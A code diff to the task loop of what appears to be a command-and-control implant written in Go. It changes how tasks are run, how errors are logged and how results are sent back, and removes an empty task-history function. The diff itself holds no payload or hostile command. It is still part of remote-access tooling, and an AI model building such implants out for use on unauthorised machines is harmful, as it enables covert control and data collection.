@@ -78,26 +78,20 @@ func (i *thisImplant) ServiceTasks() error {
 	//implant and from the api
 	// i think eventually the task and result and task history reconciliation
 	// should all be done server side, limit how much is sent from implant.
-	taskHistory := []models.TaskHistory{}
-	for index, task := range *i.Tasks {
+	//taskHistory := []models.TaskHistory{}
+	for _, task := range *i.Tasks {
 		r, err := i.runTask(task)
 		if err != nil {
-			//should send error taskhistory/results and remove task so we don't
-			//loop
-			*i.Tasks = append((*i.Tasks)[:index], (*i.Tasks)[index+1:]...)
-			// return err
+			log.Println(err)
 		}
 		//append result append taskhistory and send both after loop completion
 		*i.Results = append(*i.Results, r)
-		taskH := models.TaskHistory{TaskObject: task, TaskResult: r}
-		taskHistory = append(taskHistory, taskH)
+		//	taskH := models.TaskHistory{TaskObject: task, TaskResult: r}
+		//taskHistory = append(taskHistory, taskH)
 	}
+	*i.Tasks = []models.Task{}
 	//send results delete task send taskhistory
 	err := i.SendResults()
-	if err != nil {
-		return err
-	}
-	err = i.SendTaskHistory()
 	if err != nil {
 		return err
 	}
@@ -154,9 +148,6 @@ func (i *thisImplant) SendResults() error {
 	return nil
 }
 
-func (i *thisImplant) SendTaskHistory() error {
-	return nil
-}
 func (i *thisImplant) GetMachineInfo() error {
 	i.Info.OS = runtime.GOOS
 	i.Info.Arch = runtime.GOARCH
